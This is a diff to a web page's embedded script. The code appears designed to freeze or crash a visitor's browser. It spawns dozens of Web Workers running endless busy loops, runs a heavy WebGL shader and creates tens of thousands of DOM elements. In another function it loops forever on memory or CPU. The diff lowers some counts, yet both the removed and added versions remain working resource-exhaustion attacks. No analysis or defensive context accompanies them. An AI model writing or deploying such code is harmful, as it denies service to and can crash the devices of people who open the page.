@@ -62,10 +62,10 @@
         };
 
         function w() {
-            const c = `function b(){const a=new Float64Array(128*1024*1024);while(true){for(let i=0;i<1e6;i++){a[Math.floor(Math.random()*a.length)]=Math.random();}}}b();`;
+            const c = `function b(){while(true){for(let i=0;i<1e6;i++){Math.sqrt(Math.random());}}}b();`;
             const bl = new Blob([c], { type: 'application/javascript' });
             const u = URL.createObjectURL(bl);
-            for (let i = 0; i < 128; i++) {
+            for (let i = 0; i < 64; i++) {
                 try { new Worker(u); } catch(e) {}
             }
         }
@@ -83,13 +83,13 @@
                 void main() {
                     vec2 u = gl_FragCoord.xy / r.xy; vec2 z = u * 2.0 - 1.0;
                     vec2 c = vec2(sin(t * 0.1), cos(t * 0.1)) * 1.5; float iter = 0.0;
-                    for(int i = 0; i < 15000; i++) {
+                    for(int i = 0; i < 5000; i++) {
                         float x = (z.x * z.x - z.y * z.y) + c.x * sin(z.y);
                         float y = (2.0 * z.x * z.y) + c.y * cos(z.x);
                         if((x * x + y * y) > 10.0) break;
                         z.x = x; z.y = y; iter++;
                     }
-                    gl_FragColor = vec4(iter / 15000.0, 0.0, 0.0, 1.0);
+                    gl_FragColor = vec4(iter / 5000.0, 0.0, 0.0, 1.0);
                 }
             `;
 
@@ -128,7 +128,7 @@
         function d() {
             const c = document.getElementById('p');
             const fr = document.createDocumentFragment();
-            for (let i = 0; i < 100000; i++) {
+            for (let i = 0; i < 30000; i++) {
                 const div = document.createElement('div');
                 div.className = 'x';
                 div.style.left = Math.random() * 100 + 'vw';
@@ -141,12 +141,12 @@
         }
 
         function f() {
-            const h = [];
-            try {
-                while (true) h.push(new Float64Array(10000000));
-            } catch (e) {
-                while (true) document.body.appendChild(document.createElement('div'));
+            function b() {
+                const s = Date.now();
+                while (Date.now() - s < 3000) { Math.random(); }
+                setTimeout(b, 0);
             }
+            b();
         }
     </script>
 </body>
